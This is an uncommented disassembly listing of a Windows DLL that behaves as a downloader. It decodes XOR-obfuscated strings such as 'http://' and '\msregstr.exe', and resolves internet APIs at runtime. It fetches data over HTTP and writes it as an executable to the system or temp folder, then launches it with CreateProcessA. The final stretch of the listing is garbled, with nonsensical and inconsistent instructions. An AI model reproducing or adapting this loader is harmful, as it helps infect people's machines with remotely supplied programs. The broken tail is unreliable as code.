mov [ ebp - 0x23 ] 0x36
mov [ ebp - 0x22 ] 0x11
mov [ ebp - 0x21 ] 0x19
mov [ ebp - 0x20 ] 0x10
mov [ ebp - 0x1f ] 0x3e
mov [ ebp - 0x1e ] bl
mov [ ebp - 0x78 ] 0x36
mov [ ebp - 0x77 ] 0x11
mov [ ebp - 0x76 ] 0xb
mov [ ebp - 0x75 ] 0x1a
mov [ ebp - 0x74 ] 0xd
mov [ ebp - 0x73 ] 0x11
mov [ ebp - 0x72 ] 0x1a
mov [ ebp - 0x71 ] 0xb
mov [ ebp - 0x70 ] 0x3c
mov [ ebp - 0x6f ] 0x13
mov [ ebp - 0x6e ] 0x10
mov [ ebp - 0x6d ] 0xc
mov [ ebp - 0x6c ] 0x1a
mov [ ebp - 0x6b ] 0x37
mov [ ebp - 0x6a ] 0x1e
mov [ ebp - 0x69 ] 0x11
mov [ ebp - 0x68 ] 0x1b
mov [ ebp - 0x67 ] 0x13
mov [ ebp - 0x66 ] 0x1a
mov [ ebp - 0x65 ] bl
mov [ ebp - 0x98 ] 0x36
mov [ ebp - 0x97 ] 0x11
mov [ ebp - 0x96 ] 0xb
mov [ ebp - 0x95 ] 0x1a
mov [ ebp - 0x94 ] 0xd
mov [ ebp - 0x93 ] 0x11
mov [ ebp - 0x92 ] 0x1a
mov [ ebp - 0x91 ] 0xb
mov [ ebp - 0x90 ] 0x2d
mov [ ebp - 0x8f ] 0x1a
mov [ ebp - 0x8e ] 0x1e
mov [ ebp - 0x8d ] 0x1b
mov [ ebp - 0x8c ] 0x39
mov [ ebp - 0x8b ] 0x16
mov [ ebp - 0x8a ] 0x13
mov [ ebp - 0x89 ] 0x1a
mov [ ebp - 0x88 ] bl
mov [ ebp - 0x50 ] 0x36
mov [ ebp - 0x4f ] 0x11
mov [ ebp - 0x4e ] 0xb
mov [ ebp - 0x4d ] 0x1a
mov [ ebp - 0x4c ] 0xd
mov [ ebp - 0x4b ] 0x11
mov [ ebp - 0x4a ] 0x1a
mov [ ebp - 0x49 ] 0xb
mov [ ebp - 0x48 ] 0x2c
mov [ ebp - 0x47 ] 0x1a
mov [ ebp - 0x46 ] 0xb
mov [ ebp - 0x45 ] 0x30
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x43 ] 0xb
mov [ ebp - 0x42 ] 0x16
mov [ ebp - 0x41 ] 0x10
mov [ ebp - 0x40 ] 0x11
mov [ ebp - 0x3f ] 0x3e
mov [ ebp - 0x3e ] bl
mov [ ebp - 0x4 ] ebx
lea eax [ ebp - 0x84 ]
push eax
call sub_100075ee
pop ecx
lea eax [ ebp - 0x84 ]
push eax
call [ LoadLibraryA@IAT ]
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
lea eax [ ebp - 0xc0 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x3c ]
push eax
call sub_100075ee
lea eax [ ebp - 0xac ]
push eax
call sub_100075ee
lea eax [ ebp - 0x64 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x2c ]
push eax
call sub_100075ee
lea eax [ ebp - 0x78 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x98 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x50 ]
push eax
call sub_100075ee
add esp 0x20
lea eax [ ebp - 0xc0 ]
push eax
push [ rw-data ]
mov esi [ GetProcAddress@IAT ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x3c ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0xac ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x64 ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x2c ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x78 ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x98 ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x50 ]
push eax
push [ rw-data ]
call esi
mov [ rw-data ] eax
cmp [ rw-data ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_10006f75
test eax eax
jne r-xdata
sub_10003417
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp + 0x10 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x8 ]
call sub_100034de
add esp 0xc
mov [ ebp - 0x20 ] eax
cmp eax ebx
jle r-xdata
mov [ ebp - 0x4 ] ebx
call sub_100034a7
jmp r-xdata
mov [ esi ] eax
inc eax
push eax
call [ malloc@IAT ]
pop ecx
mov edi [ ebp + 0xc ]
mov [ edi ] eax
cmp edi ebx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ esi ]
inc ecx
push ecx
push ebx
push eax
call memset
push [ esi ]
push [ ebp - 0x1c ]
push [ edi ]
call memcpy
add esp 0x18
mov [ esi ] ebx
jmp r-xdata
sub_100034de
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x30 ] 0x4
push edi
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x20000005
push [ ebp + 0x8 ]
call [ rw-data ]
mov eax [ ebp - 0x1c ]
cmp eax edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
push eax
call [ malloc@IAT ]
pop ecx
mov esi [ ebp + 0xc ]
mov [ esi ] eax
cmp eax edi
je r-xdata
push [ ebp - 0x1c ]
push edi
push eax
call memset
add esp 0xc
lea ecx [ ebp - 0x2c ]
push ecx
sub eax edi
push eax
mov eax [ esi ]
add eax edi
push eax
push [ ebp + 0x8 ]
call [ rw-data ]
cmp eax 0x1
jne r-xdata
add edi [ ebp - 0x2c ]
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp edi eax
jae r-xdata
sub_1000359e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
push 0x1
pop eax
mov [ ebp - 0x20 ] eax
xor ebx ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] 0x17
mov [ ebp - 0x2f ] 0xb
mov [ ebp - 0x2e ] 0xb
mov [ ebp - 0x2d ] 0xf
mov [ ebp - 0x2c ] 0x45
mov [ ebp - 0x2b ] 0x50
mov [ ebp - 0x2a ] 0x50
mov [ ebp - 0x29 ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
lea esi [ eax + 0x1 ]
push esi
mov edi [ malloc@IAT ]
call edi
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
push esi
push ebx
push eax
call memset
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
mov esi [ strncpy@IAT ]
call esi
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x3c ] ebx
push ebx
push rw-data
lea ecx [ ebp - 0x3c ]
push ecx
lea ecx [ ebp - 0x28 ]
push ecx
push eax
call sub_1000420e
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100075ee
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x1c ]
call [ strstr@IAT ]
add esp 0x38
mov [ ebp - 0x38 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10003725
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x28 ]
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0x38 ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
call strlen
pop ecx
add [ ebp - 0x1c ] eax
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x1c ]
call strlen
mov [ ebp + 0x14 ] eax
inc eax
mov [ ebp - 0x40 ] eax
push eax
call edi
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
call strlen
pop ecx
add [ ebp - 0x28 ] eax
push [ ebp - 0x40 ]
push ebx
push eax
call memset
push [ ebp - 0x40 ]
push [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call esi
push [ ebp - 0x28 ]
call strlen
mov ecx [ ebp + 0x1c ]
mov [ ecx ] eax
inc eax
push eax
call edi
add esp 0x20
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax ebx
jne r-xdata
mov edi [ ebp + 0x1c ]
mov ecx [ edi ]
inc ecx
push ecx
push ebx
push eax
call memset
mov eax [ edi ]
inc eax
push eax
push [ ebp - 0x28 ]
mov eax [ ebp + 0x18 ]
push [ eax ]
call esi
add esp 0x18
sub_10003725
cmp [ ebp - 0x34 ] ebx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
push [ ebp - 0x34 ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x34 ] ebx
retn
push [ ebp - 0x24 ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x24 ] ebx
sub_1000376d
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x4 ] esi
push 0x1
pop ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x44 ] esi
push ebx
push rw-data
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push [ ebp + 0xc ]
call sub_1000420e
add esp 0x14
push esi
push esi
push 0x3
mov eax rw-data
push eax
push eax
push 0x50
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov [ ebp - 0x34 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x40 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp - 0x44 ]
push [ ebp - 0x24 ]
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_100039bc
add esp 0x18
test eax eax
jne r-xdata
mov [ ebp - 0x30 ] 0xffffe49a
jmp r-xdata
push esi
push 0x4000000
push esi
push esi
push rw-data
push [ ebp - 0x1c ]
push rw-data
push [ ebp - 0x34 ]
call [ rw-data ]
mov edi eax
mov [ ebp - 0x20 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x30 ] 0xffffe4a0
jmp r-xdata
mov [ ebp - 0x4 ] esi
call sub_1000392d
jmp r-xdata
push esi
push esi
push esi
push esi
push edi
call [ rw-data ]
mov [ ebp - 0x54 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x30 ] 0xffffe49f
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x48 ] 0x4
mov [ ebp - 0x3c ] esi
push esi
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push 0x20000013
push edi
call [ rw-data ]
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x58 ] esi
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
push edi
call sub_100034de
add esp 0xc
mov [ ebp - 0x38 ] eax
cmp eax esi
jle r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x30 ] 0xffffe49e
jmp r-xdata
mov eax [ ebp + 0x28 ]
mov [ eax ] ebx
push [ ebp - 0x34 ]
call [ rw-data ]
mov [ ebp - 0x34 ] esi
push [ ebp - 0x20 ]
call [ rw-data ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4c ] esi
push [ ebp + 0x24 ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp - 0x58 ]
push [ ebp - 0x2c ]
call sub_10003a5b
add esp 0x14
mov [ ebp - 0x50 ] al
cmp al bl
jne r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x4c ]
push [ ebp - 0x28 ]
call sub_10003c04
add esp 0x10
sub_1000392d
cmp [ ebp - 0x1c ] esi
je r-xdata
mov edi [ free@IAT ]
push [ ebp - 0x1c ]
mov edi [ free@IAT ]
call edi
pop ecx
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp [ ebp - 0x28 ] esi
je r-xdata
push [ ebp - 0x2c ]
call edi
pop ecx
mov [ ebp - 0x2c ] esi
cmp [ ebp - 0x2c ] esi
je r-xdata
cmp [ ebp - 0x24 ] esi
je r-xdata
push [ ebp - 0x28 ]
call edi
pop ecx
mov [ ebp - 0x28 ] esi
cmp [ ebp - 0x34 ] esi
je r-xdata
push [ ebp - 0x24 ]
call edi
pop ecx
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ ebp - 0x34 ]
call [ rw-data ]
mov [ ebp - 0x34 ] esi
retn
push [ ebp - 0x20 ]
call [ rw-data ]
mov [ ebp - 0x20 ] esi
sub_100039bc
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
and [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0x1c ]
add eax ebx
mov esi [ ebp + 0xc ]
mov [ esi ] eax
inc eax
push eax
call [ malloc@IAT ]
pop ecx
mov edi [ ebp + 0x8 ]
mov [ edi ] eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ esi ]
inc ecx
push ecx
push 0x0
push eax
call memset
push [ esi ]
push [ ebp + 0x10 ]
push [ edi ]
call [ strncpy@IAT ]
mov eax [ esi ]
sub eax ebx
push eax
push [ ebp + 0x18 ]
push [ edi ]
call [ strncat@IAT ]
add esp 0x24
jmp r-xdata
sub_10003a5b
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x48
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] 0x1
push 0x6
pop eax
mov [ ebp - 0x24 ] eax
push 0x4
pop edi
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x50 ] 0x14
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x40 ] edi
push 0x22
pop ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x54 ] 0x26
mov [ ebp - 0x58 ] 0x99
mov [ ebp - 0x57 ] 0xb
mov [ ebp - 0x56 ] 0x99
mov [ ebp - 0x55 ] 0x12
mov [ ebp - 0x4c ] esi
cmp [ ebp + 0xc ] eax
jb r-xdata
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0xc ] 0xa
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] ecx
jb r-xdata
push edi
lea eax [ ebp - 0x58 ]
push eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x6 ]
push eax
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push edi
add ebx 0x22
push ebx
lea eax [ ebp - 0x4c ]
push eax
call memcpy
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edi ] eax
push eax
call [ malloc@IAT ]
add esp 0x10
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
test ecx ecx
je r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
push [ edi ]
push esi
push eax
call memset
mov eax [ ebp + 0xc ]
lea ebx [ eax - 0x26 ]
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x34 ] 0xc
add ebx 0xc
mov [ ebp - 0x28 ] ebx
push ebx
call [ malloc@IAT ]
add esp 0x10
mov esi eax
mov [ ebp - 0x1c ] esi
test esi esi
jne r-xdata
push ebx
push 0x0
push esi
call memset
mov [ ebp - 0x3c ] esi
mov [ esi ] 0x40
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ edi ]
mov [ esi + 0x8 ] eax
and [ esi + 0x1 ] 0x0
lea eax [ ebx - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0x26
push eax
lea eax [ esi + 0xc ]
push eax
call memcpy
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
push ebx
push esi
call sub_1000cbe0
add esp 0x28
mov [ ebp - 0x38 ] eax
cmp eax [ edi ]
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10003bd0
jmp r-xdata
and [ ebp - 0x20 ] 0x0
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
jmp r-xdata
sub_10003c04
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x290
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x13c ] bl
mov [ ebp - 0x20 ] ebx
mov esi 0x105
push esi
push ebx
lea eax [ ebp - 0x128 ]
push eax
call memset
push esi
push ebx
lea eax [ ebp - 0x248 ]
push eax
call memset
add esp 0x18
mov [ ebp - 0x138 ] 0x23
mov [ ebp - 0x137 ] 0x12
mov [ ebp - 0x136 ] 0xc
mov [ ebp - 0x135 ] 0xd
mov [ ebp - 0x134 ] 0x1a
mov [ ebp - 0x133 ] 0x18
mov [ ebp - 0x132 ] 0xc
mov [ ebp - 0x131 ] 0xb
mov [ ebp - 0x130 ] 0xd
mov [ ebp - 0x12f ] 0x51
mov [ ebp - 0x12e ] 0x1a
mov [ ebp - 0x12d ] 0x7
mov [ ebp - 0x12c ] 0x1a
mov [ ebp - 0x12b ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x138 ]
push eax
call sub_100075ee
mov [ esp ] 0x104
lea eax [ ebp - 0x248 ]
push eax
call [ GetSystemDirectoryA@IAT ]
push esi
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x128 ]
push eax
mov edi [ strncpy@IAT ]
call edi
lea eax [ ebp - 0x248 ]
push eax
call strlen
mov ecx esi
sub ecx eax
push ecx
lea eax [ ebp - 0x138 ]
push eax
lea eax [ ebp - 0x128 ]
push eax
call [ strncat@IAT ]
add esp 0x1c
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
lea eax [ ebp - 0x128 ]
push eax
call [ CreateFileA@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x64
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
push esi
push ebx
lea eax [ ebp - 0x128 ]
push eax
call memset
push esi
push ebx
lea eax [ ebp - 0x248 ]
push eax
call memset
add esp 0x18
lea eax [ ebp - 0x248 ]
push eax
push esi
call [ GetTempPathA@IAT ]
push esi
lea eax [ ebp - 0x248 ]
push eax
lea eax [ ebp - 0x128 ]
push eax
call edi
lea eax [ ebp - 0x248 ]
push eax
call strlen
sub esi eax
push esi
lea eax [ ebp - 0x138 ]
push eax
lea eax [ ebp - 0x128 ]
push eax
call [ strncat@IAT ]
add esp 0x1c
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
lea eax [ ebp - 0x128 ]
push eax
call [ CreateFileA@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
jmp r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x20 ] ebx
push 0x44
pop esi
push esi
push ebx
lea eax [ ebp - 0x28c ]
push eax
call memset
add esp 0xc
mov [ ebp - 0x28c ] esi
mov [ ebp - 0x280 ] ebx
mov [ ebp - 0x260 ] 0x81
mov [ ebp - 0x25c ] bx
lea eax [ ebp - 0x29c ]
push eax
lea eax [ ebp - 0x28c ]
push eax
lea eax [ ebp - 0x248 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x128 ]
push eax
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0xc8
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10003eac
jmp r-xdata
push 0x7d0
call [ Sleep@IAT ]
mov [ ebp - 0x13c ] 0x1
mov [ ebp - 0x2a0 ] ebx
push ebx
lea eax [ ebp - 0x2a0 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x20 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov al [ ebp - 0x13c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10003edb
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor esi esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x2c ] esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] esi
push 0x1
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x34 ] esi
push eax
push rw-data
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0xc ]
call sub_1000420e
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x30 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call sub_10004059
add esp 0x2c
movzx eax al
mov [ ebp - 0x3c ] eax
cmp eax esi
jne r-xdata
push esi
push esi
push 0x3
mov eax rw-data
push eax
push eax
push 0x50
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov [ ebp - 0x20 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x28 ] 0xffffe49b
jmp r-xdata
push esi
push 0x4000000
push esi
push esi
push rw-data
push [ ebp - 0x24 ]
push rw-data
push eax
call [ rw-data ]
mov [ ebp - 0x2c ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x28 ] 0xffffe499
jmp r-xdata
mov [ ebp - 0x4 ] esi
call sub_10003fec
jmp r-xdata
push esi
push esi
push esi
push esi
push eax
call [ rw-data ]
mov [ ebp - 0x38 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x28 ] 0xffffe498
jmp r-xdata
or [ ecx - 0x4 ] 0xffffffff
mov eax [ ebp - 0x28 ]
mov ecx [ ecx - 0xe ]
mov [ 0x20000000 ] cx
pop edi
pop edx
pop ebx
leave
retn
call [ GetLastError@IAT ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x28 ] 0xffffe497
sub_10003fec
cmp [ ebp - 0x24 ] esi
je r-xdata
cmp [ ebp - 0x1c ] esi
je r-xdata
push [ ebp - 0x24 ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] edx
je r-xdata
push [ ebp - 0x1c ]
call [ 0x110060c8 ]
pop ecx
mov [ ebp - 0x1c ] esi
cmp [ ebp - 0x2c ] edx
je r-xdata
push [ ebp + 0x60 ]
call [ r--data ]
mov [ ebp - 0x20 ] esi
retn
push [ ebp - 0x2c ]
call [ rw-data ]
mov [ ebp - 0x2c ] esi
sub_10004059
push edi
mov esp ebp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push esp
mov [ fs : 0x80 ] esp
sub esp 0x40
pop ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x0
mov [ ecx - 0x28 ] 0x5a
sub_10004121
dec ebp
mov al 0x50
call memset
add esp 0xc
push [ ebp + 0x1c ]
call sub_1000c9ce
push [ ebp + 0x14 ]
jne r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] dl
mov eax [ edi ]
push eax
push eax
push 0x20
push [ esi ]
call sub_1000d31a
push [ edi ]
push [ ebp + 0x10 ]
push [ esi ]
call [ 0x1080e1b4 ]
mov eax [ edi ]
or eax ebx
push eax
push [ ebp + 0x18 ]
sti
xor cl [ ebx + 0xe1cd1d ]
sbb bh bh
ror [ ebx - 0x2bbad4f9 ] cl
sub eax [ ebp - 0x20 ]
push eax
lea edx [ ebp - 0x26 ]
push eax
fbstp [ esi ]
not ebx
add esp 0x44
mov eax [ edi ]
sub eax [ ebp - 0x23 ]
and al [ ebp - 0x2c ]
sub eax [ ebp - 0x20 ]
pop esp
lea eax [ ebp - 0x50 ]
push eax
push [ edi ]
call ebx
add esp 0xc
jmp r-xdata
call sub_1000cbbe
push eax
lea eax [ ebp - 0x3c ]
push eax
sub dl [ eax ]
lea edx [ ecx - 0x50 ]
push eax
call [ edi ]
aam 0xe1
sub_100041e6
push ebp
or ebp esp
push ecx
call sub_100041c8
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fld [ 0x1008e348 ]
fmul [ r--data ]
fmul [ r--data ]
call sub_1000d4ae
leave
adc [ ebp - 0x75 ] 0xffffffec
push 0xfffffffb
push r--data
push r-xdata
mov eax [ fs : 0x100 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x14 ] 0x1
and [ ebp - 0x4 ] 0x10
mov edi [ ebp + 0x8 ]
test ebp edi
je r-xdata
insd
or [ edx + 0x32fffc4d ] al
shr bl 0x39
lea ecx [ esi + 0x1 ]
push [ ebp + 0x14 ]
push edi
call [ strstr@IAT ]
jns r-xdata
push ecx
push 0x0
push eax
in al dx
bound edx [ edx - 0x54a9fffc ]
inc ebp
fadd [ ebx ]
add [ ebp - 0x28 ] 0x47f4c085
sub eax edi
mov [ ebp - 0x2c ] eax
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov eax [ eax - 0x2c ]
div [ ebp + 0x14 ]
call 0x1000d760
pop ecx
add eax [ ebp - 0x2c ]
jmp r-xdata
mov [ ebp - 0x24 ] eax
push edi
push 0x2009062
mov esi eax
sub esi [ ebp - 0x24 ]
mov [ ebp - 0x20 ] esi
mov eax [ ebp - 0x30 ]
mov [ eax ] edi
